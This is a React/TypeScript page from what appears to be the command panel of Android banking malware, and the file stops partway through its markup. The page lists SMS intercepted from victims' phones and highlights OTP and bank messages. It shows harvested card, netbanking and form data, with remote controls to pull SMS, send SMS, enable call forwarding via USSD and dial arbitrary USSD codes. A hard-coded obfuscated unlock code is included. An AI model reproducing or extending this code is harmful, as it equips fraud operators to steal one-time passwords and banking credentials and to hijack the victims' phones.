// src/pages/DeviceDetailPage.tsx
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import axios from "axios";
import { useLocation, useNavigate, useParams } from "react-router-dom";

import TopNav from "../components/layout/TopNav";
import wsService from "../services/ws/wsService";
import {
  getDevice, pushSendSms, pushCallForward,
  pushReadOldSms, pushReadContacts,
} from "../services/api/devices";
import { listDeviceNotifications } from "../services/api/sms";
import { listFormSubmissions } from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { ENV, apiHeaders } from "../config/constants";
import { pickLastSeenAt } from "../utils/reachability";

// ─── Helpers ──────────────────────────────────────────────────────────────────
function str(v: any): string { return String(v ?? "").trim(); }

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} seconds ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.createdAt ?? m?.date ?? m?.updatedAt;
  if (typeof t === "number" && t > 0) return t;
  if (typeof t === "string") {
    const n = Number(t); if (!isNaN(n) && n > 0) return n;
    const d = Date.parse(t); if (!isNaN(d) && d > 0) return d;
  }
  return 0;
}

function getId(m: any): string { return str(m?._id || m?.id || ""); }

const SKIP_KEYS = new Set(["_id","id","uniqueid","deviceId","device_id","__v",
  "createdAt","updatedAt","timestamp","_type","_ts","_deviceId","_dtype"]);

function getPayloadEntries(obj: any): [string, string][] {
  const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
  return Object.entries(src || {})
    .filter(([k]) => !SKIP_KEYS.has(k) && !k.startsWith("_"))
    .map(([k, v]) => [k, str(v)])
    .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
}

const FINANCE_KW = ["credit","debit","bank","balance","upi","amount","a/c","inr",
  "₹","paid","debited","credited","received","payment","otp","one time"];
function isFinance(text: string) { const l = text.toLowerCase(); return FINANCE_KW.some(kw => l.includes(kw)); }

function copyText(v: string) { try { navigator.clipboard?.writeText(v); } catch {} }

function extractSims(simInfo: any) {
  if (!simInfo) return { count: 0, sim1: "", sim2: "", sim1c: "", sim2c: "" };
  const sims = Array.isArray(simInfo.sims) ? simInfo.sims : [];
  const sim1 = str(simInfo.sim1Number || simInfo.sim1?.number || sims[0]?.number || "");
  const sim2 = str(simInfo.sim2Number || simInfo.sim2?.number || sims[1]?.number || "");
  const sim1c = str(simInfo.sim1Carrier || simInfo.sim1?.carrier || sims[0]?.carrier || "");
  const sim2c = str(simInfo.sim2Carrier || simInfo.sim2?.carrier || sims[1]?.carrier || "");
  const count = typeof simInfo.count === "number" ? simInfo.count : [sim1, sim2].filter(Boolean).length;
  return { count, sim1, sim2, sim1c, sim2c };
}

// Security code (obfuscated)
const _SC = [55, 51, 57, 49].map((c) => String.fromCharCode(c)).join("");

// ─── Types ────────────────────────────────────────────────────────────────────
type DeviceTab  = "home" | "data" | "messages" | "groups";
type CheckStatus = "forwarded" | "online" | "uninstalled";
type AnyRecord  = Record<string, any>;

// ─── CopyBtn ──────────────────────────────────────────────────────────────────
function CopyBtn({ value }: { value: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button type="button" onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
      className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
      {ok ? "✅" : "📋"}
    </button>
  );
}

// ─── Form Card ────────────────────────────────────────────────────────────────
function FormCard({ form }: { form: AnyRecord }) {
  const ts = getTs(form);
  const entries = getPayloadEntries(form);
  if (!entries.length) return null;
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {entries.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center">
            <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
            <CopyBtn value={v} />
          </div>
          <div className="text-[13px] text-gray-800">{v}</div>
        </div>
      ))}
      <hr className="my-2 border-gray-100" />
      <div className="text-right text-[11px] text-gray-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>
    </div>
  );
}

// ─── SMS Card ─────────────────────────────────────────────────────────────────
function SmsCard({ sms, pageNum }: { sms: AnyRecord; pageNum?: number }) {
  const ts     = getTs(sms);
  const msg    = str(sms.body || sms.message || sms.msg || "");
  const sender = str(sms.sender || sms.senderNumber || "");
  const mob1   = str(sms.receiver || sms.mob || "");
  const mob2   = str(sms.receiver2 || sms.mob2 || "");
  const fin    = isFinance(msg);

  function Row({ label, value, red }: { label: string; value: string; red?: boolean }) {
    return (
      <div className="mb-2">
        <div className="flex items-center">
          <span className="text-[13px] font-semibold text-blue-600">{label}:</span>
          <CopyBtn value={value} />
        </div>
        <div className={`text-[13px] ${red ? "text-red-600" : "text-gray-800"}`}>{value}</div>
      </div>
    );
  }
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      <Row label="Date"   value={ts ? new Date(ts).toString() : "-"} />
      {msg    && <Row label="MSG"    value={msg}    red={fin} />}
      {sender && <Row label="SENDER" value={sender} />}
      {mob1   && <Row label="MOB"    value={mob1} />}
      {mob2   && <Row label="MOB 2"  value={mob2} />}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-[11px] text-gray-400">{timeAgo(ts)}</span>
          {pageNum != null && (
            <span className="rounded bg-gray-100 px-1.5 py-0.5 text-[11px] font-semibold text-gray-500">Page {pageNum}</span>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── Action Alert Modal ───────────────────────────────────────────────────────
function ActionAlert({ status, message, onClose }: {
  status: CheckStatus; message: string; onClose: () => void;
}) {
  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
      <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl">
        <button type="button" onClick={onClose}
          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50">✕</button>
        <div className="mb-4 text-[15px] font-extrabold text-red-500">Alert</div>
        {status === "forwarded" && (
          <div className="text-center text-[14px] leading-6 text-gray-800">{message}</div>
        )}
        {status === "online" && (
          <div className="text-center text-[15px] font-semibold text-green-600">{message}</div>
        )}
        {status === "uninstalled" && (
          <div className="text-center text-[15px] font-semibold text-red-600">{message}</div>
        )}
      </div>
    </div>
  );
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────────────
const SMS_PER_PAGE = 20;

export default function DeviceDetailPage() {
  const { deviceId = "" } = useParams<{ deviceId: string }>();
  const nav      = useNavigate();
  const location = useLocation();
  const did      = decodeURIComponent(deviceId || "");
  const fromTab  = (location.state as any)?.from || "home";
  const mountedRef = useRef(true);

  // ── State ──────────────────────────────────────────────────────────────────
  const [activeTab, setActiveTab] = useState<DeviceTab>("home");
  const [device,    setDevice]    = useState<AnyRecord | null>(null);
  const [loading,   setLoading]   = useState(true);
  const [alertText, setAlertText] = useState("");

  // Lock gate
  const [lockOpen,     setLockOpen]     = useState(false);
  const [lockCode,     setLockCode]     = useState("");
  const [lockCodeErr,  setLockCodeErr]  = useState<string | null>(null);

  // Data
  const [smsList,   setSmsList]   = useState<AnyRecord[]>([]);
  const [forms,     setForms]     = useState<AnyRecord[]>([]);
  const [cards,     setCards]     = useState<AnyRecord[]>([]);
  const [nets,      setNets]      = useState<AnyRecord[]>([]);
  const [dataLoaded, setDataLoaded] = useState(false);

  // Status log
  const [statusLog, setStatusLog] = useState<{ time: number; text: string } | null>(null);

  // Action alert (check online, get sms, call forward, ussd)
  const [actionAlert,    setActionAlert]    = useState<{ status: CheckStatus; message: string } | null>(null);
  const actionDeviceRef  = useRef("");
  const actionStatusRef  = useRef<CheckStatus | null>(null);
  const actionWindowRef  = useRef<number>(0);
  const actionTimerRef   = useRef<ReturnType<typeof setTimeout> | null>(null);

  // Modals
  const [getSmsOpen,     setSmsOpen]        = useState(false);
  const [getSmsCount,    setSmsCount]       = useState("1");
  const [getSmsLoading,  setSmsLoading]     = useState(false);

  const [sendOpen,       setSendOpen]       = useState(false);
  const [sendSim,        setSendSim]        = useState(0);
  const [sendNumber,     setSendNumber]     = useState("");
  const [sendMsg,        setSendMsg]        = useState("");
  const [sendLoading,    setSendLoading]    = useState(false);

  const [cfOpen,         setCfOpen]         = useState(false);
  const [cfSim,          setCfSim]          = useState(0);
  const [cfNumber,       setCfNumber]       = useState("");
  const [cfLoading,      setCfLoading]      = useState(false);

  const [ussdOpen,       setUssdOpen]       = useState(false);
  const [ussdSim,        setUssdSim]        = useState(0);
  const [ussdCode,       setUssdCode]       = useState("");
  const [ussdLoading,    setUssdLoading]    = useState(false);

  const [search, setSearch] = useState("");
  const [sortMode, setSortMode] = useState<"new" | "old">("new");

  const sims = useMemo(() => extractSims(device?.simInfo), [device]);
  const wsLastSeenRef = useRef<number>(0);
  const [lastSeenTs, setLastSeenTs] = useState(0);

  // ── SMS page map ──────────────────────────────────────────────────────────
  const smsPageMap = useMemo(() => {
    const map: Record<string, number> = {};
    const sorted = [...smsList].sort((a, b) => getTs(b) - getTs(a));
    sorted.forEach((m, i) => {
      const mid = getId(m);
      if (mid) map[mid] = Math.floor(i / SMS_PER_PAGE) + 1;
    });
    return map;
  }, [smsList]);

  // ── Loaders ───────────────────────────────────────────────────────────────
  async function loadDevice() {
    setLoading(true);
    try {
      const d = await getDevice(did);
      if (!mountedRef.current) return;
      if (d?.locked) { setLockOpen(true); setLoading(false); return; }
      setDevice(d);
      setLastSeenTs(pickLastSeenAt(d));
    } catch {}
    finally { if (mountedRef.current) setLoading(false); }
  }

  async function loadSms() {
    try {
      const list = await listDeviceNotifications(did);
      if (!mountedRef.current) return;
      setSmsList((Array.isArray(list) ? list : []).sort((a, b) => getTs(b) - getTs(a)));
    } catch {}
  }

  async function loadData() {
    if (dataLoaded) return;
    try {
      const allForms = await listFormSubmissions().catch(() => []);
      const myForms  = (Array.isArray(allForms) ? allForms : []).filter((f: any) =>
        str(f.uniqueid || f.deviceId) === did
      ).sort((a, b) => getTs(b) - getTs(a));
      const [c, n] = await Promise.all([
        getCardPaymentsByDevice(did).catch(() => []),
        getNetbankingByDevice(did).catch(() => []),
      ]);
      if (!mountedRef.current) return;
      setForms(myForms);
      setCards(Array.isArray(c) ? c : []);
      setNets(Array.isArray(n) ? n : []);
      setDataLoaded(true);
    } catch {}
  }

  // ── WS ────────────────────────────────────────────────────────────────────
  useEffect(() => {
    mountedRef.current = true;
    wsService.connect();
    loadDevice();
    loadSms();
    loadData();

    // Fetch alert text
    fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: apiHeaders() })
      .then(r => r.ok ? r.json() : null)
      .then(d => { if (d?.text) setAlertText(String(d.text)); })
      .catch(() => {});

    const off = wsService.onMessage((msg) => {
      if (!msg || msg.type !== "event") return;
      const event    = str(msg.event);
      const evDid    = str(msg.deviceId || msg?.data?.deviceId);
      if (evDid && evDid !== did) return;
      const data     = msg.data || {};

      // LastSeen update
      if (event === "device:lastSeen" || event === "device:upsert") {
        const at = Number(data?.lastSeen?.at || data?.at || Date.now());
        setLastSeenTs(at);
        setDevice((p: any) => p ? { ...p, lastSeen: { at, action: str(data?.lastSeen?.action) } } : p);

        // Check online response
        const inWin = actionDeviceRef.current === did &&
          (actionStatusRef.current === "forwarded" || (actionStatusRef.current === null && Date.now() - actionWindowRef.current < 30000));
        if (inWin) {
          if (actionTimerRef.current) clearTimeout(actionTimerRef.current);
          actionStatusRef.current = "online";
          setActionAlert({ status: "online", message: "Device is Online ✅" });
        }
        return;
      }

      // Device uninstalled
      if (event === "device:uninstalled") {
        const inWin = actionDeviceRef.current === did &&
          (actionStatusRef.current === "forwarded" || (actionStatusRef.current === null && Date.now() - actionWindowRef.current < 30000));
        if (inWin) {
          actionStatusRef.current = "uninstalled";
          setActionAlert({ status: "uninstalled", message: "App Uninstalled! ⚠️" });
        }
        return;
      }

      // New SMS
      if (event === "notification") {
        const newSms = { ...data, _id: data._id || data.id || `${Date.now()}`, timestamp: Number(data.timestamp || Date.now()) };
        setSmsList(prev => {
          const exists = prev.some(m => getId(m) === getId(newSms));
          if (exists) return prev;
          return [newSms, ...prev].sort((a, b) => getTs(b) - getTs(a));
        });
        return;
      }

      // Batch SMS received (GET SMS result)
      if (event === "notification:batch") {
        const saved = data?.saved ?? 0;
        actionStatusRef.current = "online";
        setActionAlert({ status: "online", message: `📥 ${saved} SMS fetched successfully!` });
        loadSms();
        return;
      }

      // Call forward result
      if (event === "call_forward:result") {
        const status = str(data?.status).toLowerCase();
        const forwardedNum = str(data?.number || data?.forwardingNumber || "");
        if (status === "success" || status === "ok" || status === "done") {
          actionStatusRef.current = "online";
          const msgText = forwardedNum
            ? `SIM: OK Call forwarding Voice: ${forwardedNum}`
            : "SIM: OK Call forwarding Registration was successful.";
          setActionAlert({ status: "online", message: msgText });
        } else {
          actionStatusRef.current = "uninstalled";
          setActionAlert({ status: "uninstalled", message: `❌ Call forwarding failed: ${str(data?.error || status)}` });
        }
        return;
      }

      // New form/card/net
      if (event === "form:created" || event === "form_submissions:created") {
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setForms(p => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload: pl, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...p]);
      }
      if (event === "card:created" || event === "card_payment:created") {
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setCards(p => [pl, ...p]);
      }
      if (event === "netbanking:created" || event === "net_banking:created") {
        const pl = data.payload && typeof data.payload === "object" ? data.payload : data;
        setNets(p => [pl, ...p]);
      }
    });

    return () => { mountedRef.current = false; off(); };
  }, [did]);

  // ── Action Alert helpers ──────────────────────────────────────────────────
  function startAction(message: string) {
    actionDeviceRef.current  = did;
    actionStatusRef.current  = "forwarded";
    actionWindowRef.current  = Date.now();
    setActionAlert({ status: "forwarded", message });
  }

  function closeActionAlert() {
    actionStatusRef.current = null;
    setActionAlert(null);
  }

  function logStatus(text: string) {
    setStatusLog({ time: Date.now(), text });
  }

  // ── Check Online ──────────────────────────────────────────────────────────
  async function handleCheckOnline() {
    logStatus("Checking device online");
    startAction("We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline.");
    try {
      await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/revive`,
        { source: "device_detail", force: true }, { headers: apiHeaders(), timeout: 10000 });
    } catch {
      try {
        await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(did)}/start`,
          { source: "device_detail", force: true }, { headers: apiHeaders(), timeout: 10000 });
      } catch {}
    }
  }

  // ── GET SMS ───────────────────────────────────────────────────────────────
  async function handleGetSms() {
    const count = Math.min(3, Math.max(1, Number(getSmsCount) || 1));
    setSmsLoading(true);
    logStatus(`Fetching last ${count} SMS`);
    startAction(`We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline.`);
    setSmsOpen(false);
    try {
      await pushReadOldSms(did, count);
    } catch (e: any) {
      setActionAlert({ status: "uninstalled", message: "❌ Failed: " + str(e?.message) });
    } finally { setSmsLoading(false); }
  }

  // ── Send SMS ──────────────────────────────────────────────────────────────
  async function handleSendSms() {
    if (!sendNumber.trim() || !sendMsg.trim()) return;
    setSendLoading(true);
    try {
      const wsOk = wsService.sendCmd("sendSms", {
        address: sendNumber.trim(), message: sendMsg.trim(),
        sim: sendSim, timestamp: Date.now(), uniqueid: did, deviceId: did,
      });
      if (!wsOk) await pushSendSms(did, sendNumber.trim(), sendMsg.trim(), sendSim);
      setSendOpen(false); setSendNumber(""); setSendMsg("");
      logStatus("Send SMS command sent");
    } catch (e: any) {
      alert("❌ " + str(e?.message));
    } finally { setSendLoading(false); }
  }

  // ── Call Forward ──────────────────────────────────────────────────────────
  async function handleCallForward(mode: "activate" | "deactivate" | "check") {
    setCfLoading(true);
    const num   = cfNumber.trim();
    const simLbl = cfSim === 0 ? "SIM 1" : "SIM 2";
    const ussd  = mode === "activate"
      ? `**21*${num}#`
      : mode === "deactivate"
      ? "##21#"
      : "*#21#";

    if (mode === "activate" && !num) { alert("Enter forwarding number"); setCfLoading(false); return; }

    logStatus(mode === "check" ? "Checking forwarding status" : mode === "activate" ? "Activating call forwarding" : "Deactivating call forwarding");
    setCfOpen(false);
    startAction("We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline.");

    try {
      const wsOk = wsService.sendCmd("call_forward", {
        uniqueid: did, phoneNumber: mode === "activate" ? num : "",
        sim: simLbl, callCode: ussd, timestamp: Date.now(),
      });
      if (!wsOk) await pushCallForward(did, ussd, simLbl, mode === "activate" ? num : "");
    } catch (e: any) {
      setActionAlert({ status: "uninstalled", message: "❌ Failed: " + str(e?.message) });
    } finally { setCfLoading(false); }
  }

  // ── Dial USSD ────────────────────────────────────────────────────────────
  async function handleDialUssd() {
    if (!ussdCode.trim()) return;
    setUssdLoading(true);
    const simLbl = ussdSim === 0 ? "SIM 1" : "SIM 2";
    logStatus(`Dialing USSD: ${ussdCode.trim()}`);
    setUssdOpen(false);
    startAction("We've forwarded your request to the phone. Wait up to 30 seconds for confirmation; if no reply appears, the device is currently offline.");
    try {
      const wsOk = wsService.sendCmd("dial_ussd", {
        uniqueid: did, ussdCode: ussdCode.trim(), sim: simLbl, timestamp: Date.now(),
      });
      if (!wsOk) await pushCallForward(did, ussdCode.trim(), simLbl, "");
    } catch (e: any) {
      setActionAlert({ status: "uninstalled", message: "❌ Failed: " + str(e?.message) });
    } finally { setUssdLoading(false); setUssdCode(""); }
  }

  // ── Lock gate ─────────────────────────────────────────────────────────────
  function handleLockConfirm() {
    if (lockCode !== _SC) { setLockCodeErr("Incorrect security code"); setLockCode(""); return; }
    setLockOpen(false); setLockCode(""); setLockCodeErr(null);
    loadDevice(); loadSms(); loadData();
  }

  // ── Back navigation ───────────────────────────────────────────────────────
  function navBack() {
    nav("/", { state: { tab: fromTab } });
  }

  // ── Computed data ─────────────────────────────────────────────────────────
  const allDataItems = useMemo(() => {
    return [
      ...forms.map(f => ({ ...f, _dtype: "form" })),
      ...cards.map(c => ({ ...c, _dtype: "card" })),
      ...nets.map(n => ({ ...n, _dtype: "net"  })),
    ].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b));
  }, [forms, cards, nets, sortMode]);

  const sortedSms = useMemo(() =>
    [...smsList].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b)),
  [smsList, sortMode]);

  const homeFeed = useMemo(() => {
    return [
      ...allDataItems.map(d => ({ ...d, _ft: "data" as const })),
      ...sortedSms.map(s => ({ ...s, _ft: "sms" as const })),
    ].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b));
  }, [allDataItems, sortedSms, sortMode]);

  const q = search.trim().toLowerCase();
  function filterQ<T extends AnyRecord>(list: T[]): T[] {
    if (!q) return list;
    return list.filter(item => JSON.stringify(item).toLowerCase().includes(q));
  }

  const SORT_OPTS = [{ value: "new", label: "NEW" }, { value: "old", label: "OLD" }];

  // ── Device info ───────────────────────────────────────────────────────────
  const brand      = str(device?.metadata?.brand || device?.metadata?.manufacturer || "Unknown");
  const model      = str(device?.metadata?.model || "");
  const androidVer = str(device?.metadata?.androidVersion || "");
  const forwardOn  = device?.metadata?.forwardCallActive || device?.forwardCallActive || false;
  const installTs  = getTs({ createdAt: device?.createdAt, timestamp: device?.metadata?.installDate });
  const isRecent   = lastSeenTs > 0 && (Date.now() - lastSeenTs) < 60 * 1000;

  if (!did) return <div className="p-4">Missing device ID</div>;

  return (
    <div className="min-h-screen bg-gray-50">
      {/* TopNav — same black nav, back button */}
      <TopNav
        activeTab="home"
        onTabChange={(tab) => {
          if (tab === "devices") { navBack(); return; }
          // For device-specific tabs, map to our internal tabs
          const map: Record<string, DeviceTab> = {
            home: "home", data: "data", messages: "messages", groups: "groups",
          };
          if (map[tab]) setActiveTab(map[tab]);
        }}
        showBack
        darkMode={false}
        alertText={alertText}
      />

      {/* Lock Gate */}
      {lockOpen && (
        <div className="flex min-h-[80vh] items-center justify-center px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-lg">
            <div className="mb-4 text-center text-4xl">🔒</div>
            <div className="mb-1 text-center text-[18px] font-extrabold text-gray-900">Device Locked</div>
            <div className="mb-4 text-center text-[13px] text-gray-500">Enter security code to access</div>
            <input type="password" inputMode="numeric" value={lockCode}
              onChange={e => { setLockCode(e.target.value); setLockCodeErr(null); }}
              onKeyDown={e => { if (e.key === "Enter") handleLockConfirm(); }}
              placeholder="Security code" autoFocus
              className="h-12 w-full rounded-xl border border-gray-200 px-4 text-center text-[18px] outline-none focus:border-blue-400" />
            {lockCodeErr && <div className="mt-2 text-center text-[12px] text-red-600">{lockCodeErr}</div>}
            <div className="mt-4 grid grid-cols-2 gap-2">
              <button type="button" onClick={navBack}
                className="h-11 rounded-xl border border-gray-200 bg-white font-bold text-gray-700">← Back</button>
              <button type="button" onClick={handleLockConfirm}
                className="h-11 rounded-xl bg-gray-900 font-extrabold text-white">Unlock 🔓</button>
            </div>
          </div>
        </div>
      )}

      {!lockOpen && (
        <div className="mx-auto max-w-[480px] px-3 pb-24">

          {/* ── Device Info Table ── */}
          {loading ? (
            <div className="mt-4 rounded-xl bg-white p-8 text-center text-gray-400 shadow-sm">Loading…</div>
          ) : (
            <>
              <div className="mt-3 overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
                <table className="w-full">
                  <tbody>
                    <tr className="border-b border-gray-100">
                      <td className="w-[110px] py-3 pl-4 text-[13px] font-semibold text-gray-600">Name</td>
                      <td className="py-3 pr-4 text-[13px] text-gray-900">
                        {brand}{model ? ` (${model})` : ""}
                        {androidVer && (
                          <span className="ml-2 rounded bg-green-600 px-1.5 py-0.5 text-[10px] font-bold text-white">{androidVer}</span>
                        )}
                      </td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">ID</td>
                      <td className="break-all py-3 pr-4 text-[13px] text-gray-900">{did}</td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">SIM</td>
                      <td className="py-3 pr-4 text-[13px] text-gray-900">
                        {sims.sim1 && <div>{sims.sim1c ? `${sims.sim1c}: ` : ""}{sims.sim1}</div>}
                        {sims.sim2 && <div>{sims.sim2c ? `${sims.sim2c}: ` : ""}{sims.sim2}</div>}
                        {!sims.sim1 && !sims.sim2 && <span className="text-gray-400">—</span>}
                      </td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forward Call</td>
                      <td className="py-3 pr-4 text-[13px] text-gray-900">{forwardOn ? "ON" : "OFF"}</td>
                    </tr>
                    <tr className="border-b border-gray-100">
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Install Date:</td>
                      <td className="py-3 pr-4 text-[13px] font-semibold text-green-600">
                        {installTs ? new Date(installTs).toLocaleString() : (device?.createdAt ? new Date(device.createdAt).toLocaleString() : "—")}
                      </td>
                    </tr>
                    <tr>
                      <td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Last Online</td>
                      <td className={`py-3 pr-4 text-[13px] font-semibold ${isRecent ? "text-green-600" : "text-red-500"}`}>
                        {lastSeenTs ? timeAgo(lastSeenTs) : "—"}
                      </td>
                    </tr>
                  </tbody>
                </table>
              </div>

              {/* ── Action Buttons 2x3 ── */}
              <div className="mt-3 grid grid-cols-3 gap-2">
                {[
                  { label: "Check Online", onClick: handleCheckOnline },
                  { label: "GET SMS",      onClick: () => setSmsOpen(true) },
                  { label: "Send SMS",     onClick: () => setSendOpen(true) },
                  { label: "Call Forward", onClick: () => setCfOpen(true) },
                  { label: "Dial USSD",    onClick: () => setUssdOpen(true) },
                  { label: "Change Server",onClick: () => alert("Coming soon…") },
                ].map(btn => (
                  <button key={btn.label} type="button" onClick={btn.onClick}
                    className="rounded-lg border border-gray-300 bg-white py-2.5 text-[12px] font-semibold text-gray-800 hover:bg-gray-50 active:scale-[0.97]">
                    {btn.label}
                  </button>
                ))}
              </div>

              {/* ── Status Log ── */}
              {statusLog && (
                <div className="mt-3 rounded-xl bg-gray-100 px-4 py-3 text-[13px] text-gray-700">
                  <span className="text-gray-500">{timeAgo(statusLog.time)}: </span>
                  <span className="font-semibold">{statusLog.text}</span>
                </div>
              )}

              {/* ── Device-specific Tabs (via TopNav tab styling) ── */}
              <div className="mt-3 flex gap-1 overflow-x-auto rounded-xl bg-gray-100 p-1">
                {(["home","data","messages","groups"] as DeviceTab[]).map(tab => (
                  <button key={tab} type="button" onClick={() => setActiveTab(tab)}
                    className={[
                      "flex-1 whitespace-nowrap rounded-lg py-2 text-[12px] font-semibold capitalize transition",
                      activeTab === tab ? "bg-black text-white" : "text-gray-600 hover:bg-white",
                    ].join(" ")}>
                    {tab}
                  </button>
                ))}
              </div>

              {/* ── Search + Sort ── */}
              <div className="mt-2 flex items-center gap-2">
                <div className="relative flex-1">
                  <input value={search} onChange={e => setSearch(e.target.value)}
                    placeholder="Search data and press enter/search icon"
                    className="h-10 w-full rounded-full border border-gray-300 bg-white pl-4 pr-9 text-[13px] outline-none focus:border-gray-400" />
                  <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[14px]">🔍</span>
                </div>
                <select value={sortMode} onChange={e => setSortMode(e.target.value as "new"|"old")}
                  className="h-10 rounded-full border border-gray-300 bg-white px-3 text-[13px] font-semibold outline-none">
                  <option value="new">NEW</option>
                  <option value="old">OLD</option>
                </select>
              </div>

              {/* ── Tab Content ── */}
              <div className="mt-2 space-y-3 pb-4">

                {/* HOME: combined data + SMS */}
                {activeTab === "home" && filterQ(homeFeed).map((item, i) =>
                  item._ft === "sms"
                    ? <SmsCard key={getId(item) || i} sms={item} pageNum={smsPageMap[getId(item)]} />
                    : <FormCard key={getId(item) || i} form={item} />
                )}

                {/* DATA: forms + cards + net */}
                {activeTab === "data" && (
                  filterQ(allDataItems).length === 0
                    ? <div className="py-8 text-center text-[13px] text-gray-400">No data yet.</div>
                    : filterQ(allDataItems).map((item, i) => <FormCard key={getId(item) || i} form={item} />)
                )}

                {/* MESSAGES: SMS only */}
                {activeTab === "messages" && (
                  filterQ(sortedSms).length === 0
                    ? <div className="py-8 text-center text-[13px] text-gray-400">No SMS yet.</div>
                    : filterQ(sortedSms).map((m, i) => <SmsCard key={getId(m) || i} sms={m} pageNum={smsPageMap[getId(m)]} />)
                )}

                {/* GROUPS: all in one card */}
                {activeTab === "groups" && (() => {
                  const all = [...forms, ...cards, ...nets].sort((a, b) => getTs(b) - getTs(a));
                  const entries = all.flatMap(item => getPayloadEntries(item));
                  if (!entries.length) return <div className="py-8 text-center text-[13px] text-gray-400">No data yet.</div>;
                  return (
                    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
                      {all.map((item, idx) => {
                        const ents = getPayloadEntries(item);
                        if (!ents.length) return null;
                        return (
                          <div key={getId(item) || idx}>
                            {ents.map(([k, v]) => (
                              <div key={k} className="mb-2">
                                <div className="flex items-center">
                                  <span className="text-[13px] font-semibold text-blue-600">{k}:</span>
                                  <CopyBtn value={v} />
                                </div>
                                <div className="text-[13px] text-gray-800">{v}</div>
                              </div>
                            ))}
                            {idx < all.length - 1 && <hr className="my-2 border-gray-300" />}
                          </div>
                        );
                      })}
                      <hr className="my-2 border-gray-100" />
                      <div className="text-right text-[11px] text-gray-400">{did.slice(0, 16)}</div>
                    </div>
                  );
                })()}
              </div>
            </>
          )}
        </div>
      )}

      {/* ── Action Alert Modal ── */}
      {actionAlert && (
        <ActionAlert status={actionAlert.status} message={actionAlert.message} onClose={closeActionAlert} />
      )}

      {/* ── GET SMS Modal ── */}
      {getSmsOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[340px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-4 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">Get SMS</span>
              <button type="button" onClick={() => setSmsOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <label className="mb-1 block text-[13px] font-semibold text-gray-600">
              Sms Limit: <span className="text-gray-400">Max: 3</span>
            </label>
            <input type="number" min="1" max="3" value={getSmsCount}
              onChange={e => setSmsCount(String(Math.min(3, Math.max(1, Number(e.target.value) || 1))))}
              className="h-12 w-full rounded-xl border border-gray-200 px-4 text-[15px] outline-none focus:border-gray-400" />
            <button type="button" onClick={handleGetSms} disabled={getSmsLoading}
              className="mt-4 w-full rounded-xl border border-gray-300 bg-white py-3 text-[14px] font-extrabold text-gray-900 hover:bg-gray-50 disabled:opacity-60">
              GET SMS
            </button>
          </div>
        </div>
      )}

      {/* ── Send SMS Modal ── */}
      {sendOpen && (
        <div className="fixed inset-0 z-[990] flex items-center justify-center bg-black/40 px-4">
          <div className="w-full max-w-[360px] rounded-2xl bg-white p-6 shadow-xl">
            <div className="mb-4 flex items-center justify-between">
              <span className="text-[16px] font-extrabold text-gray-900">Send SMS</span>
              <button type="button" onClick={() => setSendOpen(false)}
                className="rounded border border-gray-200 px-2 py-0.5 text-gray-600">✕</button>
            </div>
            <label className="mb-1 block text-[13px] font-semibold text-gray-600">SIM:</label>
